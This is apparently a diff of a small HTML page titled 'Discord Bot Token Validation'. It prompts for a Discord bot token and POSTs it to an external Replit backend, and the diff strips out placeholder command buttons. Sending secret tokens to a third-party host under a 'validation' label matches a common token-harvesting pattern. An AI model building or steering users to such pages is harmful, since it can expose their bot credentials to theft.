@@ -3,25 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Bot Validator</title>
+    <title>Discord Bot Token Validation</title>
 </head>
 <body>
-    <h2>Enter Your Discord Bot Token</h2>
-    <input type="text" id="botToken" placeholder="Enter bot token" />
-    <button onclick="checkToken()">Submit</button>
+    <h1>Enter Your Discord Bot Token</h1>
+    <input type="text" id="token" placeholder="Enter Token">
+    <button onclick="submitToken()">Submit</button>
     
     <p id="response"></p>
-    <div id="options" style="display:none;">
-        <button onclick="commandOne()">Run Command 1</button>
-        <button onclick="commandTwo()">Run Command 2</button>
-        <!-- Add more command buttons as needed -->
-    </div>
 
     <script>
-        function checkToken() {
-            const token = document.getElementById("botToken").value;
-            
-            // Make the request to the Replit backend API
+        function submitToken() {
+            const token = document.getElementById("token").value;
             fetch("https://danielparipa1.sneakymicertifications.repl.co/api/validate", {
                 method: "POST",
                 headers: {
@@ -31,30 +24,11 @@
             })
             .then(response => response.json())
             .then(data => {
-                if (data.message) {
-                    // If bot connected successfully, show success message and options
-                    document.getElementById("response").innerText = `Bot connected as ${data.username}`;
-                    document.getElementById("options").style.display = "block"; // Show action buttons
-                } else {
-                    // If there's an error, show the error message
-                    document.getElementById("response").innerText = "Error: Invalid token or connection failed.";
-                }
+                document.getElementById("response").textContent = data.message;
             })
             .catch(error => {
-                // Handle fetch errors
-                document.getElementById("response").innerText = "Error: Could not reach the backend.";
-                console.error(error);
+                document.getElementById("response").textContent = "Error: Could not reach the backend.";
             });
-        }
-
-        function commandOne() {
-            alert("Running Command 1!");
-            // Trigger backend logic for command 1 (optional)
-        }
-
-        function commandTwo() {
-            alert("Running Command 2!");
-            // Trigger backend logic for command 2 (optional)
         }
     </script>
 </body>
